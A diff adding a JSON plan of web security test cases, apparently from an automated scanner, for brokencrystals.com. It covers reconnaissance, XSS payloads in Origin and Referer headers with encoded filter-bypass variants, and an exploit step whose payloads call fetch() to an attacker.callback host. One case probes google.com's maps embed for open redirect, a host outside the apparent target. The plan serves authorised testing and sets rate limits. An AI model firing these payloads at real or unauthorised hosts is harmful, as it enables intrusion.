@@ -1,0 +1,469 @@
+{
+  "test_cases": [
+    {
+      "id": "tc-plan-1-auth-check",
+      "hypothesis_id": "plan-auth-1",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/api/config",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Observe API config for auth mechanisms, CORS, exposed feature flags or endpoints. Single harmless GET to collect runtime tokens/headers.",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "Response contains visible auth config, public keys, CORS allow-origin wildcard or sensitive config values",
+          "threshold": {
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 1
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "First step to determine auth flow, tokens, CORS. Set needs_observation if response not present.",
+      "tags": [
+        "recon",
+        "auth-discovery",
+        "observation"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "tc-plan-2-baseline-root",
+      "hypothesis_id": "plan-recon-1",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/"
+            }
+          ],
+          "description": "Baseline root GET to capture baseline response size, cookies, CSP and script references",
+          "content_type": "text/html; charset=UTF-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "Establish baseline body length and headers for comparison with later probes",
+          "threshold": {
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 2
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "Run early to gather CSP, Referer behavior and script list. Required before header-reflection tests.",
+      "tags": [
+        "baseline",
+        "fingerprint"
+      ],
+      "estimated_duration": 1
+    },
+    {
+      "id": "tc-plan-3-headers-reflection-js-merged",
+      "hypothesis_id": "plan-xss-headers",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/assets/index-CHOz83TQ.js",
+      "parameter": "Origin, Referer",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "Origin: https://attacker.com/test\"/><script>1</script>"
+            },
+            {
+              "location": "header",
+              "value": "Referer: https://attacker.com/test\"/><script>1</script>"
+            }
+          ],
+          "description": "Inject XSS-like values into Origin and Referer headers targeting primary JS bundle. Focus on headers observed for this endpoint.",
+          "content_type": "application/javascript; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Origin",
+              "header_value": "https://attacker.com/test\"/><script>1</script>"
+            },
+            {
+              "header_name": "Referer",
+              "header_value": "https://attacker.com/test\"/><script>1</script>"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "Origin: https://attacker.example/\" onerror=alert(1)>"
+            },
+            {
+              "location": "header",
+              "value": "Referer: https://attacker.example/\" onerror=alert(1)>"
+            }
+          ],
+          "description": "Alternate header payload variants to detect DOM reflection or insufficient encoding",
+          "content_type": "application/javascript; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Origin",
+              "header_value": "https://attacker.example/\" onerror=alert(1)>"
+            },
+            {
+              "header_name": "Referer",
+              "header_value": "https://attacker.example/\" onerror=alert(1)>"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Confirm baseline root and /assets/index-... GETs executed and capture CSP and script insertion contexts",
+          "extract_from": "previous_responses",
+          "custom_logic": "Ensure CSP doesn't block inline script probes; if CSP present, downgrade to non-executable probes (encoded payloads)"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Search JS bundle and surrounding HTML for exact or decoded injected header values indicating reflection into page/JS without proper encoding",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "header_change",
+          "condition": "Server returns altered headers or sets CORS allow-origin based on injected Origin",
+          "threshold": {
+            "expected_codes": [
+              200,
+              204,
+              304
+            ]
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Consolidated header reflection tests for highest-value JS asset to reduce redundancy across many vendor files. If positive, expand to other assets.",
+      "tags": [
+        "xss_dom",
+        "headers",
+        "js",
+        "consolidated"
+      ],
+      "estimated_duration": 4
+    },
+    {
+      "id": "tc-plan-4-referrer-probe-fallbacks",
+      "hypothesis_id": "plan-xss-referer-expanded",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/assets/vendor/jquery/jquery.min.js",
+      "parameter": "Referer",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "Referer: https://attacker.com/%22%3E%3Cscript%3Econsole.log(1)%3C/script%3E"
+            },
+            {
+              "location": "header",
+              "value": "Referer: https://attacker.com/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
+            }
+          ],
+          "description": "Fallback Referer reflections against vendor assets if primary bundle not reflective. Use encoded variants to bypass naive filters.",
+          "content_type": "application/javascript; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Referer",
+              "header_value": "https://attacker.com/%22%3E%3Cscript%3Econsole.log(1)%3C/script%3E"
+            },
+            {
+              "header_name": "Referer",
+              "header_value": "https://attacker.com/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Execute only if tc-plan-3 headers-reflection-js-merged did not find reflections",
+          "extract_from": "tc-plan-3-headers-reflection-js-merged",
+          "custom_logic": "If no reflected_input signal, run these fallback vendor probes"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Detect encoded or decoded referer payloads in JS responses or HTML contexts for vendor files",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Reduced list to representative vendor file; will skip duplicate vendor endpoints unless positive signal found.",
+      "tags": [
+        "xss_dom",
+        "referer",
+        "fallback"
+      ],
+      "estimated_duration": 4
+    },
+    {
+      "id": "tc-plan-5-google-maps-pb-probe",
+      "hypothesis_id": "plan-openredirect-1",
+      "base_url": "https://www.google.com",
+      "method": "GET",
+      "endpoint": "/maps/embed",
+      "parameter": "pb",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=!1m14!1m8!1m3!1d12097.433213460943!2d-74.0062269!3d40.7101282!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0:0xb89d1fe6bc499443!2sDowntown+Conference+Center!5e0!3m2!1smk!2sbg!4v1539943755621"
+            }
+          ],
+          "description": "Baseline embed call using observed pb value to capture normal behavior and headers",
+          "content_type": "text/html",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=https://attacker.example/"
+            }
+          ],
+          "description": "Inject external URL into pb to detect redirect or location header influence",
+          "content_type": "text/html",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Detect redirect status codes when pb parameter modified",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              301,
+              302,
+              303,
+              307,
+              308
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "header_change",
+          "condition": "Location response header appears or changes when pb contains external URL",
+          "threshold": {},
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Target is external embed endpoint; low-impact probes first. Abort further pb fuzzing on redirects to attacker domain to avoid open redirect abuse.",
+      "tags": [
+        "open_redirect",
+        "embed"
+      ],
+      "estimated_duration": 3
+    },
+    {
+      "id": "tc-plan-6-escalation-on-positive-reflection",
+      "hypothesis_id": "plan-escalate-1",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/assets/index-CHOz83TQ.js",
+      "parameter": "Origin, Referer",
+      "payloads": [
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "Origin: https://attacker.com/test\"><script>fetch('https://attacker.callback/';)</script>"
+            },
+            {
+              "location": "header",
+              "value": "Referer: https://attacker.com/test\"><img src=x onerror=fetch('https://attacker.callback/')>"
+            }
+          ],
+          "description": "If reflection confirmed, attempt proof-of-exploitation callbacks to attacker-controlled URL (non-destructive DNS/HTTP callback) to confirm execution context. Only run if allowed by rules and observation.",
+          "content_type": "application/javascript; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Origin",
+              "header_value": "https://attacker.com/test\"><script>fetch('https://attacker.callback/';)</script>"
+            },
+            {
+              "header_name": "Referer",
+              "header_value": "https://attacker.com/test\"><img src=x onerror=fetch('https://attacker.callback/')>"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Execute only if tc-plan-3 produced reflected_input and CSP allows external fetch/execution",
+          "extract_from": "tc-plan-3-headers-reflection-js-merged",
+          "custom_logic": "Validate signals: reflected_input true AND no strict CSP/report-only blocking inline exec; otherwise skip"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "http_callback",
+          "condition": "Attacker-controlled endpoint receives HTTP(s) callback indicating script executed in victim context",
+          "threshold": {},
+          "weight": 1.0
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Response behavior and callbacks confirm DOM XSS execution",
+          "threshold": {},
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "all",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "High-sensitivity exploit step: run only after positive reflection and policy approval. Use safe callbacks and minimal payloads.",
+      "tags": [
+        "exploit",
+        "xss_verification",
+        "callback"
+      ],
+      "estimated_duration": 5
+    },
+    {
+      "id": "tc-plan-7-rate-limit-and-stop-conditions",
+      "hypothesis_id": "plan-safety-1",
+      "base_url": "https://brokencrystals.com",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Execution control test-case encoding global rate-limits and stop conditions across the plan",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "timing_anomaly",
+          "condition": "If any endpoint returns 429, significant increase in latency, or 5xx errors, pause further tests against that host for cooldown period",
+          "threshold": {
+            "expected_codes": [
+              429,
+              500,
+              502,
+              503,
+              504
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 1
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.0,
+      "notes": "Global execution controls: throttle to 1 req/sec per host by default; on 429 or 5xx pause host for 5 minutes and abort escalation tests. Abort exploit steps if any unexpected auth prompts appear.",
+      "tags": [
+        "safety",
+        "rate-limit"
+      ],
+      "estimated_duration": 0
+    }
+  ]
+}
